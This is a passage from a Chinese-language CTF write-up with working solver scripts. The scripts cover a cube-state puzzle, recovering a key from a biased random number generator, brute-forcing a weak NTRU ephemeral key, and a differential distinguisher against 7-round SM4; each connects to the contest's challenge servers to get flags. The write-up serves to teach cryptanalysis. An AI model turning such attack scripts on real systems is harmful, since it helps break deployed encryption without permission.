    P[1],P[3]=base[14],base[12]; P[12],P[14]=base[7],base[5]
    P[5],P[7]=base[9],base[11]; P[9],P[11]=base[1],base[3]
    perms["R'"] = tuple(P)
    
    # 生成 180度转动 (X2)
    for k in list(perms.keys()):
        p1 = perms[k]; p2 = tuple(p1[i] for i in p1)
        perms[k.replace("'","")+"2"] = p2
    return perms

def main():
    perms = get_permutations()
    # 初始状态：U=0, D=1, F=2, B=3, L=4, R=5
    # 每个面 4 个块，共 24 个块
    start_state = []
    for i in range(6): start_state.extend([i]*4)
    start_state = tuple(start_state)
    
    # BFS 生成表
    visited = {start_state: ""}
    queue = collections.deque([start_state])
    moves_list = ["U", "U'", "U2", "D", "D'", "D2", "F", "F'", "F2", "B", "B'", "B2", "L", "L'", "L2", "R", "R'", "R2"]
    
    MAX_DEPTH = 7 # 预计算深度 7
    print(f"[*] Generating Color Table Depth {MAX_DEPTH}...")
    
    t0 = time.time()
    while queue:
        curr = queue.popleft()
        path = visited[curr]
        if len(path.split()) >= MAX_DEPTH: continue
        
        last = path.split()[-1][0] if path else ""
        for m in moves_list:
            if m[0] == last: continue # 剪枝
            
            p = perms[m]
            nxt = tuple(curr[i] for i in p)
            if nxt not in visited:
                visited[nxt] = (path + " " + m).strip()
                queue.append(nxt)
                
    print(f"[+] Table Done. Size: {len(visited)}")
    with open('rubiks_color.pkl', 'wb') as f:
        pickle.dump(visited, f)

if __name__ == "__main__":
    main()
```

最后查表配合计算就能通过

```text
#!/usr/bin/env python3
from pwn import *
import pickle
import collections
import sys
import os

# ==========================================
# 1. 核心置换逻辑
# ==========================================
def get_permutations():
    perms = {}
    p = list(range(24)); p[0],p[1],p[2],p[3]=2,0,3,1
    p[8],p[9],p[20],p[21],p[12],p[13],p[16],p[17] = 20,21,12,13,16,17,8,9
    perms['U'] = tuple(p)
    p = list(range(24)); p[0],p[1],p[2],p[3]=1,3,0,2
    p[8],p[9],p[16],p[17],p[12],p[13],p[20],p[21] = 16,17,12,13,20,21,8,9
    perms["U'"] = tuple(p)
    p = list(range(24)); p[4],p[5],p[6],p[7]=6,4,7,5
    p[10],p[11],p[18],p[19],p[14],p[15],p[22],p[23] = 18,19,14,15,22,23,10,11
    perms['D'] = tuple(p)
    p = list(range(24)); p[4],p[5],p[6],p[7]=5,7,4,6
    p[10],p[11],p[22],p[23],p[14],p[15],p[18],p[19] = 22,23,14,15,18,19,10,11
    perms["D'"] = tuple(p)
    base=list(range(24)); P=list(range(24)); P[8],P[9],P[10],P[11]=10,8,11,9
    P[2],P[3]=base[19],base[17]; P[17],P[19]=base[4],base[5]
    P[4],P[5]=base[22],base[20]; P[20],P[22]=base[2],base[3]
    perms['F'] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[8],P[9],P[10],P[11]=9,11,8,10
    P[2],P[3]=base[20],base[22]; P[20],P[22]=base[5],base[4]
    P[4],P[5]=base[17],base[19]; P[17],P[19]=base[3],base[2]
    perms["F'"] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[12],P[13],P[14],P[15]=14,12,15,13
    P[0],P[1]=base[21],base[23]; P[21],P[23]=base[7],base[6]
    P[6],P[7]=base[16],base[18]; P[16],P[18]=base[1],base[0]
    perms['B'] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[12],P[13],P[14],P[15]=13,15,12,14
    P[0],P[1]=base[18],base[16]; P[16],P[18]=base[6],base[7]
    P[6],P[7]=base[23],base[21]; P[21],P[23]=base[0],base[1]
    perms["B'"] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[16],P[17],P[18],P[19]=18,16,19,17
    P[0],P[2]=base[15],base[13]; P[13],P[15]=base[6],base[4]
    P[4],P[6]=base[8],base[10]; P[8],P[10]=base[0],base[2]
    perms['L'] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[16],P[17],P[18],P[19]=17,19,16,18
    P[0],P[2]=base[8],base[10]; P[8],P[10]=base[4],base[6]
    P[4],P[6]=base[15],base[13]; P[13],P[15]=base[2],base[0]
    perms["L'"] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[20],P[21],P[22],P[23]=22,20,23,21
    P[1],P[3]=base[9],base[11]; P[9],P[11]=base[5],base[7]
    P[5],P[7]=base[14],base[12]; P[12],P[14]=base[3],base[1]
    perms['R'] = tuple(P)
    base=list(range(24)); P=list(range(24)); P[20],P[21],P[22],P[23]=21,23,20,22
    P[1],P[3]=base[14],base[12]; P[12],P[14]=base[7],base[5]
    P[5],P[7]=base[9],base[11]; P[9],P[11]=base[1],base[3]
    perms["R'"] = tuple(P)
    
    for k in list(perms.keys()):
        p1 = perms[k]; p2 = tuple(p1[i] for i in p1)
        perms[k.replace("'","")+"2"] = p2
    return perms

PERMS = get_permutations()
MOVES_LIST = ["U", "U'", "U2", "D", "D'", "D2", "F", "F'", "F2", "B", "B'", "B2", "L", "L'", "L2", "R", "R'", "R2"]

def get_inverse_seq(moves_str):
    if not moves_str: return ""
    inv_map = {
        "U": "U'", "U'": "U", "U2": "U2", "D": "D'", "D'": "D", "D2": "D2",
        "F": "F'", "F'": "F", "F2": "F2", "B": "B'", "B'": "B", "B2": "B2",
        "L": "L'", "L'": "L", "L2": "L2", "R": "R'", "R'": "R", "R2": "R2"
    }
    return " ".join([inv_map[m] for m in moves_str.split()[::-1]])

# ==========================================
# 2. 回溯法解析器 (Backtracking Parser)
# ==========================================
def parse_candidates(text):
    face_map = {'U':0, 'D':1, 'F':2, 'B':3, 'L':4, 'R':5}
    # 深拷贝一份 raw 结构
    raw_template = {k: [['?','?'],['?','?']] for k in "UDFBLR"}
    
    lines = text.splitlines()
    cur = None
    ridx = 0
    seen = set()
    
    for line in lines:
        line = line.strip()
        if line.startswith("Face"):
            parts = line.split()
            if len(parts) > 1:
                cur = parts[1].strip(":")
                seen.add(cur); ridx=0
        elif line.startswith("|"):
            parts = line.strip("|").split()
            if len(parts)==2 and cur:
                raw_template[cur][ridx] = parts
                ridx+=1
    
    hidden_list = list(set("UDFBLR")-seen)
    if not hidden_list: return [] 
    hidden = hidden_list[0]
    
    # 定义标准角块
    corners_std = [
        frozenset({'U','R','F'}), frozenset({'U','F','L'}), frozenset({'U','L','B'}), frozenset({'U','B','R'}),
        frozenset({'D','F','R'}), frozenset({'D','L','F'}), frozenset({'D','B','L'}), frozenset({'D','R','B'})
    ]
    
    slots = [
        {'id':0, 'pos':[('U',1,1),('F',0,1),('R',0,0)]}, 
        {'id':1, 'pos':[('U',1,0),('F',0,0),('L',0,1)]}, 
        {'id':2, 'pos':[('U',0,0),('L',0,0),('B',0,1)]}, 
        {'id':3, 'pos':[('U',0,1),('B',0,0),('R',0,1)]}, 
        {'id':4, 'pos':[('D',0,1),('F',1,1),('R',1,0)]}, 
        {'id':5, 'pos':[('D',0,0),('F',1,0),('L',1,1)]}, 
        {'id':6, 'pos':[('D',1,0),('B',1,1),('L',1,0)]}, 
        {'id':7, 'pos':[('D',1,1),('B',1,0),('R',1,1)]} 
    ]
    
    # 区分可见槽位和隐藏槽位
    hidden_slots_indices = []
    # 初始可用角块
    available = list(corners_std)
    
    # 先填充完全可见的
    import copy
    current_raw = copy.deepcopy(raw_template)
    
    for i, slot in enumerate(slots):
        cols = []
        is_hidden = False
        for (f,r,c) in slot['pos']:
            if f == hidden: is_hidden = True
            else: cols.append(current_raw[f][r][c])
        
        vis_set = frozenset(cols)
        
        if not is_hidden:
            # 必须精准匹配一个
            match_idx = -1
            for idx, piece in enumerate(available):
                if piece == vis_set:
                    match_idx = idx
                    break
            if match_idx == -1: return [] # 物理不可能
            available.pop(match_idx)
        else:
            hidden_slots_indices.append({'idx': i, 'vis': vis_set, 'pos_list': slot['pos']})
            
    # 回溯搜索填充剩下的槽位
    valid_results = []
    
    def backtrack(slot_ptr, current_avail, current_faces):
        if slot_ptr == len(hidden_slots_indices):
            # 所有槽位已填充，生成 tuple
            res = []
            try:
                for f in "UDFBLR":
                    for r in range(2):
                        for c in range(2):
                            res.append(face_map[current_faces[f][r][c]])
                valid_results.append(tuple(res))
            except: pass
            return

        # 当前要处理的槽位
        h_info = hidden_slots_indices[slot_ptr]
        vis = h_info['vis']
        
        # 寻找候选角块
        candidates = []
        for idx, piece in enumerate(current_avail):
            if vis.issubset(piece):
                candidates.append(idx)
        
        # 尝试每一个候选
        for c_idx in candidates:
            piece = current_avail[c_idx]
            diff = list(piece - vis)[0] # 找到那个隐藏的颜色
            
            # 填入 diff 到 raw 结构
            # 找到 pos 中 f == hidden 的那个位置
            target_pos = None
            for (f,r,c) in h_info['pos_list']:
                if f == hidden: target_pos = (f,r,c); break
            
            f,r,c = target_pos
            # 状态拷贝
            next_faces = copy.deepcopy(current_faces)
            next_faces[f][r][c] = diff
            
            next_avail = current_avail[:]
            next_avail.pop(c_idx)
            
            backtrack(slot_ptr + 1, next_avail, next_faces)

    backtrack(0, available, current_raw)
    return valid_results

# ==========================================
# 3. 主程序
# ==========================================
def main():
    print("[*] Loading table 'rubiks_color.pkl'...")
    if not os.path.exists('rubiks_color.pkl'):
        print("[-] Error: rubiks_color.pkl not found!")
        sys.exit(1)

    with open('rubiks_color.pkl', 'rb') as f:
        TABLE = pickle.load(f)
    print(f"[+] Table loaded. Size: {len(TABLE)}")
    
    io = remote("nc1.ctfplus.cn", 40928)
    
    for i in range(100):
        try:
            data = io.recvuntil(b"[?] Enter your solution:", drop=False).decode()
        except EOFError:
            break
        
        if "FLAG" in data:
            print("\n" + "="*40)
            print(data)
            print("="*40 + "\n")
            break
            
        print(f"=== Round {i+1} ===")
        
        chunk = data.split(f"Round {i+1}")[-1] if f"Round {i+1}" in data else data
            
        # 1. 获取所有可能的候选状态
        candidates = parse_candidates(chunk)
        if not candidates:
            print("[-] Parse failed (No candidates).")
            io.sendline(b"")
            continue
            
        # 2. 对每个候选状态尝试求解
        solution_found = False
        
        # 优先检查直接在表里的 (Depth <= 7)
        for cand in candidates:
            if cand in TABLE:
                sol = get_inverse_seq(TABLE[cand])
                print(f"[+] Solved via Table! Path length: {len(sol.split())}")
                io.sendline(sol.encode())
                solution_found = True
                break
        
        if solution_found: continue
            
        # 3. 如果没找到，对每个候选做 BFS (Total Depth 11)
        # 为了效率，我们交替搜索或者只要有一个搜到就停止
        for cand_idx, cand in enumerate(candidates):
            # BFS Depth 4
            q = collections.deque([(cand, "")])
            local_vis = {cand}
            
            while q:
                curr, path = q.popleft()
                
                # Check Table
                if curr in TABLE:
                    p1 = path
                    p2 = get_inverse_seq(TABLE[curr])
                    sol = (p1 + " " + p2).strip()
                    print(f"[+] Solved Candidate {cand_idx}! Path length: {len(sol.split())}")
                    io.sendline(sol.encode())
                    solution_found = True
                    break
                
                if len(path.split()) >= 4:
                    continue
                    
                last = path.split()[-1][0] if path else ""
                for m in MOVES_LIST:
                    if m[0] == last: continue
                    p_idx = PERMS[m]
                    nxt = tuple(curr[k] for k in p_idx)
                    if nxt not in local_vis:
                        local_vis.add(nxt)
                        q.append((nxt, (path + " " + m).strip()))
            
            if solution_found: break
            
        if not solution_found:
            print(f"[-] Not found (Candidates: {len(candidates)})")
            io.sendline(b"")
            
    io.interactive()

if __name__ == "__main__":
    main()
```

![](/images/wp/unictf-wp/image-026.png)









## crypto
### Subgroup-Weaver
```text
from random import randint, randbytes
from Crypto.Util.number import bytes_to_long
from secret import flag

key = randbytes(64)

def gen(bits):
    return sum(randint(1, 7) % 2 * 2**i for i in range(bits))

def otp():
    return bytes_to_long(key) ^ gen(len(key) * 8)

while input('> ') != key.hex():
    print(otp())

print(f'your prize: {flag}')
```

拿到题目脚本 `task.py`，核心逻辑如下：

```text
key = randbytes(64)  # 目标：由于 Key 是随机生成的，我们无法预测，必须通过泄露还原

def gen(bits):
    # 生成噪声流
    return sum(randint(1, 7) % 2 * 2**i for i in range(bits))

def otp():
    # 核心泄露点：输出 = Key 异或 噪声
    return bytes_to_long(key) ^ gen(len(key) * 8)
```

程序提供了一个 Oracle，我们可以无限次获取 `otp()` 的值。我们需要利用这些输出还原出 `key`。

漏洞原理

**随机数偏差**

漏洞点在于 `gen` 函数中的随机数生成方式：

`randint(1, 7)` 生成 $1$ 到 $7$ 的整数。

我们要关注的是 `randint(1, 7) % 2` 的结果：

+ **结果为 1 的情况**：1, 3, 5, 7 （共 4 种）
+ **结果为 0 的情况**：2, 4, 6 （共 3 种）

因此，生成的比特流存在明显的统计偏差：

+ $P(\text{bit}=1) = \frac{4}{7} \approx 57.14\%$
+ $P(\text{bit}=0) = \frac{3}{7} \approx 42.86\%$

异或泄露 (Correlation Attack)

题目输出计算公式为：$O_i = K_i \oplus N_i$

其中 $O_i$ 是输出的第 $i$ 位，$K_i$ 是 Key 的第 $i$ 位，$N_i$ 是噪声位。

+ **假设 ****$K_i = 0$**：

$O_i = 0 \oplus N_i = N_i$。

此时观察到的输出 $O_i$ 继承了噪声的分布，即 **1 出现的概率为 57%**。

+ **假设 ****$K_i = 1$**：

$O_i = 1 \oplus N_i = \neg N_i$（取反）。

此时观察到的输出 $O_i$ 翻转了噪声的分布，即 **1 出现的概率变为 $1 - 57\% = 43\%$**

大体思路如下:

1. **数据采集**：连接服务器，连续发送换行符，收集大量（如 2000 组）`otp()` 的输出值。
2. **统计分析**：
    - 遍历 Key 的每一位（0 到 511 位）。
    - 统计该位在所有样本中出现 `1` 的次数。
    - 如果 `1` 的比例显著大于 50%，则该位 Key 为 `0`。
    - 如果 `1` 的比例显著小于 50%，则该位 Key 为 `1`。
3. **工程化处理**：
    - 由于数据量大，直接 `recv` 会导致 TCP 拆包（数字被切断），必须使用缓冲区拼接算法（Buffer Reassembly）确保数字完整。
    - 在发送 Key 前，必须清空缓冲区（Drain Buffer），防止残留的输出干扰 Flag 的读取。

exp

```text
import socket
import time

def solve():
    # 题目信息
    HOST = 'nc1.ctfplus.cn'
    PORT = 24952
    
    # 攻击参数：2000次采样足以在 4/7 vs 3/7 的偏差中获得极高的置信度
    ROUNDS = 2000
    BATCH_SIZE = 100 # 管道化发送，加速采集
    
    print(f"[*] Connecting to {HOST}:{PORT} ...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((HOST, PORT))
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    # 1. 初始化：消耗掉欢迎语和第一个提示符
    time.sleep(0.5)
    try:
        s.recv(4096)
    except: pass

    samples = []
    buffer = b"" # TCP 拼包缓冲区
    total_sent = 0

    print(f"[*] Collecting {ROUNDS} samples with TCP reassembly...")

    # 2. 采集阶段
    while len(samples) < ROUNDS:
        # 管道化发送：保持网络繁忙，提高吞吐量
        if total_sent < ROUNDS + 50:
            try:
                s.sendall(b'\n' * BATCH_SIZE)
                total_sent += BATCH_SIZE
            except: pass
        
        # 接收数据
        try:
            s.settimeout(0.5)
            chunk = s.recv(65535)
            if not chunk: break
            buffer += chunk
        except socket.timeout:
            pass
        
        # 核心逻辑：解决 TCP 粘包/拆包问题
        # 只有遇到换行符才截取，保证数字完整性
        while b'\n' in buffer:
            line_bytes, buffer = buffer.split(b'\n', 1)
            line = line_bytes.strip().replace(b'>', b'').strip()
            
            if line.isdigit():
                samples.append(int(line))
        
        print(f"\r[+] Samples: {len(samples)}/{ROUNDS}", end='')
        if len(samples) >= ROUNDS:
            break

    print(f"\n[+] Sampling complete.")

    # 3. 清空缓冲区 (Drain)
    # 必须把服务器还在发送的数据读完，否则发 Key 时会有干扰
    print(f"[*] Draining remaining buffer...")
    s.settimeout(0.5)
    while True:
        try:
            chunk = s.recv(65535)
            if not chunk: break
        except:
            break

    # 4. 统计分析还原 Key
    print("[*] Analyzing bits...")
    recovered_key_int = 0
    # 使用前 ROUNDS 个样本
    valid_samples = samples[:ROUNDS]
    
    for i in range(512): # Key 长度 64字节 = 512位
        # 统计第 i 位是 1 的次数
        ones = sum(1 for x in valid_samples if (x >> i) & 1)
        
        # 判决门限：样本的一半
        # 如果 Key位是0，1的概率是 57% -> ones > rounds/2
        # 如果 Key位是1，1的概率是 43% -> ones < rounds/2
        if ones < (len(valid_samples) / 2):
            recovered_key_int |= (1 << i)

    key_hex = recovered_key_int.to_bytes(64, 'big').hex()
    print(f"[+] Recovered Key: {key_hex}")

    # 5. 发送 Key 获取 Flag
    print("[*] Sending Key...")
    s.sendall(key_hex.encode() + b'\n')

    s.settimeout(5)
    response = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            response += chunk
            if b'}' in response: break
        except:
            break
            
    print("\n" + "="*20 + " FLAG " + "="*20)
    print(response.decode(errors='ignore').strip())
    print("="*46)
    s.close()

if __name__ == '__main__':
    solve()
```

![](/images/wp/unictf-wp/image-027.png)



### NTRU


```text
"""
NTRU Challenge - Public Parameters
"""
N = 31
p = 257
q = 12289
h = [9603, 11838, 1242, 5868, 12249, 3130, 3722, 5910, 5879, 7672, 1119, 339, 10748, 7310, 6370, 9353, 10589, 10739, 10213, 2560, 5132, 4889, 11292, 2649, 2556, 8037, 3146, 9533, 11563, 1554, 304]
c = [91, 11459, 932, 4345, 12153, 9504, 5147, 7268, 2493, 8891, 8712, 5785, 11608, 7683, 11327, 8453, 10380, 6004, 7849, 1622, 6154, 10369, 10278, 769, 11676, 11492, 4564, 5445, 10909, 11502, 12216]

if __name__ == "__main__":
    print("NTRU Challenge Parameters:")
    print(f"N = {N}")
    print(f"p = {p}")
    print(f"q = {q}")
    print(f"r_weight = 4")
    print("h (first 5):", h[:5], "...")
    print("c (first 5):", c[:5], "...")
    print()
    print("Encryption: c = r * h + m (mod q, x^N-1)")
    print(f"where r has only 4 non-zero coefficients (±1)")
    print("Goal: recover the message m containing the flag")
```

题目给的是一个简化版 NTRU 加密的公开参数（`public.py`）：

+ N=31N = 31N=31
+ p=257p = 257p=257
+ q=12289q = 12289q=12289
+ 公钥多项式 hhh（长度 N 的系数向量）
+ 密文多项式 ccc

加密关系：

+ c=r∗h+m(mod(q, xN−1))c = r * h + m \pmod{(q,\ x^N-1)}c=r∗h+m(mod(q, xN−1))
+ 并且 **r 只有 4 个非零系数，且每个是 ****±****1****\pm1****±****1**（weight=4）

这些都在 `public.py` 里直接写明：

---

NTRU 工作在环：

Rq=Zq[x]/(xN−1)R_q = \mathbb{Z}_q[x] / (x^N - 1)Rq=Zq[x]/(xN−1)

所以多项式乘法是**循环卷积**（因为 xN≡1x^N \equiv 1xN≡1）：

如果把多项式表示为长度 N 的数组 a[i],b[i]a[i], b[i]a[i],b[i]，则：

(a∗b)[k]=∑i=0N−1a[i]⋅b[(k−i)modN]  (mod q)(a*b)[k] = \sum_{i=0}^{N-1} a[i]\cdot b[(k-i)\bmod N]\ \ (\bmod\ q)(a∗b)[k]=i=0∑N−1a[i]⋅b[(k−i)modN]  (mod q)

（等价写法：res[(i+j)%N] += a[i]*b[j]）

---

3. 核心漏洞：

题目明确说：

+ r 的非零项只有 4 个
+ 每个非零项取值为 ±1

所以 r 的可能性：

1. 选 4 个位置：(314)=31465\binom{31}{4} = 31465(431)=31465
2. 每个位置符号 ±：24=162^4 = 1624=16

总枚举量：

(314)⋅24=31465⋅16=503440\binom{31}{4}\cdot 2^4 = 31465 \cdot 16 = 503440(431)⋅24=31465⋅16=503440

50 万级别，Python 轻松跑完。

---

4. 如何从 r 得到 m？

由加密式：

c=r∗h+m(modq)c = r*h + m \pmod qc=r∗h+m(modq)

若猜对 r，则：

m≡c−r∗h(modq)m \equiv c - r*h \pmod qm≡c−r∗h(modq)

得到的 m 是模 q 的系数，但题目还给了 p=257p=257p=257，消息一般在模 p 下（尤其 257 很像“字节扩展域”，0..255 可用，256 常作异常/填充标记）。

因此进一步取：

mp[i]=mq[i]modpm_p[i] = m_q[i] \bmod pmp[i]=mq[i]modp

然后把每个系数当成一个字节（0..255）拼成 bytes，检查是否出现 flag 格式（如 `UniCTF{...}`）。

实战里经常会过滤掉出现 256 的候选（因为 byte 不会是 256），这能极大减少误报

exp，同目录下运行

```text
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import itertools

PARAM_FILE = "public.py"

def mul_cyclic(a, b, mod):
    """(a*b) mod (x^N-1, mod)  循环卷积"""
    N = len(a)
    res = [0] * N
    for i, ai in enumerate(a):
        if ai == 0:
            continue
        for j, bj in enumerate(b):
            res[(i + j) % N] = (res[(i + j) % N] + ai * bj) % mod
    return res

def sub_mod(a, b, mod):
    return [(x - y) % mod for x, y in zip(a, b)]

def score_printable(bs: bytes) -> int:
    printable = set(range(32, 127))
    return sum(b in printable for b in bs)

def main():
    ns = {}
    with open(PARAM_FILE, "r", encoding="utf-8") as f:
        exec(f.read(), ns)

    N = ns["N"]
    p = ns["p"]
    q = ns["q"]
    h = list(ns["h"])
    c = list(ns["c"])

    best = None  # (score, r_vec, msg_bytes)

    for comb in itertools.combinations(range(N), 4):
        for signs in itertools.product([1, -1], repeat=4):
            r = [0] * N
            for pos, sgn in zip(comb, signs):
                r[pos] = sgn

            rh = mul_cyclic(r, h, q)
            m_q = sub_mod(c, rh, q)
            m_p = [x % p for x in m_q]

            # p=257：256 通常不属于字节消息（0..255），可过滤
            if any(x == 256 for x in m_p):
                continue

            msg = bytes(m_p)
            sc = score_printable(msg)

            if best is None or sc > best[0]:
                best = (sc, r, msg)

            # 强命中：常见 flag 结构
            if b"UniCTF{" in msg or b"CTF{" in msg or b"ctf{" in msg:
                print("[+] Found r (weight=4):",
                      [(i, r[i]) for i in range(N) if r[i] != 0])
                print("[+] Raw msg:", msg)
                print("[+] Flag:", msg.rstrip(b"\x00").decode("utf-8", errors="replace"))
                return

    # 若没早停，输出最像文本的那个
    if best:
        sc, r, msg = best
        print("[*] Best printable score:", sc)
        print("[*] r nonzero (pos,sign):", [(i, r[i]) for i in range(N) if r[i] != 0])
        print("[*] msg:", msg)
        print("[*] msg (rstrip \\x00):", msg.rstrip(b"\x00"))

if __name__ == "__main__":
    main()

```

![](/images/wp/unictf-wp/image-028.png)



### Subgroup-Scribe
```text
from os import urandom
from random import randint
from secret import flag

sbox = [147, 138, 104,  87,   5, 201, 249, 141, 243,  72,  71, 221,  97, 174,  48, 155,
        114, 225, 117, 105, 224,  70,   7, 108, 190, 146, 145, 130,  46, 209, 229, 226,
         15, 112, 103,  27,  91, 181, 253, 183, 152, 165, 110,  44, 160,  66, 116,   0,
         75,  26,  61,  96, 127, 157, 197, 164, 172,  20,  37,  68, 202, 101,   9,   3,
        109,  31, 208,  98,  11, 144,  79,  25, 239, 231,  43,  36,  10,   2, 170, 251,
        161, 135, 134, 166, 136, 177, 215,  82, 244, 218,  47, 137, 242,  76, 233, 115,
        182, 153, 214,  84,  13, 159,  60,  74,  65,  54, 163,  56, 180,  30, 139, 236,
         67,  64,  80, 119,  40, 206, 148,  93, 217,  81, 126, 162, 185, 186,  77, 234,
         45, 142, 230, 179,  34, 193, 124, 107, 125, 198,  90,  23,  12, 232, 100,  16,
        120,  59,   1,   6, 102,  24, 133, 176, 150, 187,  28,  51, 195,  85, 196, 219,
        167, 227,  38,  55, 248, 241, 204, 235, 192, 194,  52, 252, 247,   4, 212,  58,
         78, 245, 240,  21,  14,  29, 169,   8, 121,  86, 118, 184, 143, 129,  69, 205,
        132, 213, 246, 238,  73,  53, 122,  62,  35, 210, 250, 149,  17, 203, 111,  18,
        158,  33, 151,  50,  83,  57,  92, 123,  95,  63, 216, 189, 173, 175, 220,  94,
        106,  41, 222, 154,  89, 156, 171,  32, 200,  88, 254,  99, 140, 228, 188, 207,
         19, 113, 255,  49, 237, 223, 191, 168,  42, 211,  22, 199, 128,  39, 178, 131]


FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC]
CK = [0x00070E15, 0x8C939AA1, 0x181F262D, 0xA4ABB2B9, 0xAC019832, 0XD8DFE6ED, 0X2C333A41]


def rotl(x, n):
    return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))

def tau(a):
    return ((sbox[(a >> 24) & 0xFF] << 24) |
            (sbox[(a >> 16) & 0xFF] << 16) |
            (sbox[(a >> 8) & 0xFF] << 8) |
             sbox[a & 0xFF])

def L(b):
    return b ^ rotl(b, 2) ^ rotl(b, 10) ^ rotl(b, 18) ^ rotl(b, 24)

def T(x):
    return L(tau(x))

def T_prime(x):
    b = tau(x)
    return b ^ rotl(b, 13) ^ rotl(b, 23)

def gen_key(mk_int):
    k = [(mk_int >> 96) & 0xFFFFFFFF, (mk_int >> 64) & 0xFFFFFFFF, 
         (mk_int >> 32) & 0xFFFFFFFF, mk_int & 0xFFFFFFFF]
    k = [k[0] ^ FK[0], k[1] ^ FK[1], k[2] ^ FK[2], k[3] ^ FK[3]]
    rk = []
    for i in range(7):
        k_next = k[i] ^ T_prime(k[i+1] ^ k[i+2] ^ k[i+3] ^ CK[i])
        k.append(k_next)
        rk.append(k_next)
    return rk

def encrypt(msg, key):
    assert len(msg) == len(key) == 16

    msg = int.from_bytes(msg)
    key = int.from_bytes(key)
    rk = gen_key(key)
    x = [(msg >> 96) & 0xFFFFFFFF, (msg >> 64) & 0xFFFFFFFF, 
         (msg >> 32) & 0xFFFFFFFF, msg & 0xFFFFFFFF]
    
    for i in range(7):
        x_next = x[0] ^ T(x[1] ^ x[2] ^ x[3] ^ rk[i])
        x = x[1:] + [x_next]
    
    y = x[::-1]
    return int.to_bytes((y[0] << 96) | (y[1] << 64) | (y[2] << 32) | y[3], 16)

def enc_ecb(msg, key):
    assert len(msg) % 16 == len(key) % 16 == 0
    msg = [msg[16 * i : 16 * i + 16] for i in range(len(msg) // 16)]
    enc = []
    for i in msg:
        enc += [encrypt(i, key)]
        key = bytes([sbox[i] for i in key])
    return b''.join(enc)

ROUNDS = 128
for r in range(ROUNDS):
    print(f"--- Round {r + 1}/{ROUNDS} ---")
    key = urandom(16)
    coin = randint(0, 1)
    msg = bytes.fromhex(input('msg > '))
    if len({*zip(*[iter(msg)] * 16)}) * 16 != len(msg): print('🤡'); exit()
    enc = enc_ecb(msg, key)
    print(f'hint: {[enc.hex(), urandom(len(enc)).hex()][coin]}')
    if int(input('give me coin > ')) != coin: print('🤬'); exit()
print(f'😊: {flag}')
```

这是一个典型的“Oracle 区分攻击”题目。服务器提供了一个加密黑盒，你需要通过 128 轮测试，每一轮判断服务器生成的数据是“真实加密结果 (Real)”还是“随机数 (Random)”。

**算法环境**：

+ **算法核心**：SM4 分组密码的变体。
+ **轮数削减**：标准 32 轮 -> **7 轮**。
+ **S-box**：自定义 S-box，非标准参数。
+ **密钥调度**：非常规更新逻辑，存在极短的周期。

2**. 核心漏洞分析**

**漏洞 A**：密钥调度的 128 周期性 (The Key Cycle)

通过分析题目逻辑（或测试），我们发现密钥更新机制存在 `key = sbox[key]` 形式的置换。由于 S-box 是一个有限域上的置换，它必然存在循环。

对于这道题的 S-box，其置换环的长度为 **128**。

这意味着：

+ 第 0 个块使用的密钥 $K_0$ 和第 128 个块使用的密钥 $K_{128}$ 是**完全相同**的。
+ **利用点**：这允许我们在一次交互中，构造出针对“同一密钥”的差分对 $(P_0, P_{128})$，从而消除了密钥未知带来的不确定性。

**漏洞 B**：SM4 的特定差分路径 (Delayed Diffusion)

SM4 是一种广义 Feistel 结构（或者叫 Lai-Massey 结构变体），其轮函数更新逻辑为：

$$X_{i+4} = X_i \oplus T(X_{i+1} \oplus X_{i+2} \oplus X_{i+3} \oplus RK_i)$$

如果我们构造一个特殊的输入差分模式 $(\alpha, \alpha, \alpha, 0)$，其中 $\alpha$ 是任意非零差分（本题选用 `0x80`），我们可以利用异或的性质抵消差分，使前几轮的非线性层（S-box）完全失效。

**差分传播推导：**

设输入差分为 $\Delta P = (\Delta X_0, \Delta X_1, \Delta X_2, \Delta X_3) = (\alpha, \alpha, \alpha, 0)$。

1. **Round 1**:
    - $T$ 函数的输入差分：$\Delta In_1 = \Delta X_1 \oplus \Delta X_2 \oplus \Delta X_3 = \alpha \oplus \alpha \oplus 0 = 0$。
    - 因为输入无差分，输出也无差分：$\Delta Out_1 = 0$。
    - 状态更新：$\Delta X_4 = \Delta X_0 \oplus \Delta Out_1 = \alpha \oplus 0 = \alpha$。
    - **结论**：完美穿透，无扩散。
2. **Round 2**:
    - $T$ 函数的输入差分：$\Delta In_2 = \Delta X_2 \oplus \Delta X_3 \oplus \Delta X_4 = \alpha \oplus 0 \oplus \alpha = 0$。
    - $\Delta Out_2 = 0$。
    - 状态更新：$\Delta X_5 = \Delta X_1 \oplus \Delta Out_2 = \alpha \oplus 0 = \alpha$。
    - **结论**：再次穿透。
3. **Round 3**:
    - $T$ 函数的输入差分：$\Delta In_3 = \Delta X_3 \oplus \Delta X_4 \oplus \Delta X_5 = 0 \oplus \alpha \oplus \alpha = 0$。
    - $\Delta Out_3 = 0$。
    - 状态更新：$\Delta X_6 = \Delta X_2 \oplus \Delta Out_3 = \alpha \oplus 0 = \alpha$。
    - **结论**：连续 3 轮线性穿透！
4. **Round 4 (关键轮)**:
    - $T$ 函数的输入差分：$\Delta In_4 = \Delta X_4 \oplus \Delta X_5 \oplus \Delta X_6 = \alpha \oplus \alpha \oplus \alpha = \alpha$。
    - **激活**：此时输入差分不为 0，触发 $T$ 函数（S-box + L变换）。
    - 状态更新：$\Delta X_7 = \Delta X_3 \oplus T(\dots) = 0 \oplus \Delta Y_{active}$。
    - **结论**：$\Delta X_7$ 的值完全取决于 $T$ 函数对输入差分 $\alpha$ 的响应。

**漏洞 C**：密文结构泄露

SM4 的 7 轮加密结束后，状态为 $(X_7, X_8, X_9, X_{10})$。

根据 SM4 的反序输出标准，密文 $C = (X_{10}, X_9, X_8, X_7)$。

**注意**：密文的**最后 4 个字节**正是 $X_7$！

结合漏洞 B，我们知道对于真实加密，$\Delta X_7$ 必须属于集合 $S = \{ L(S(x) \oplus S(x \oplus \alpha)) \mid x \in 0..255 \}$。

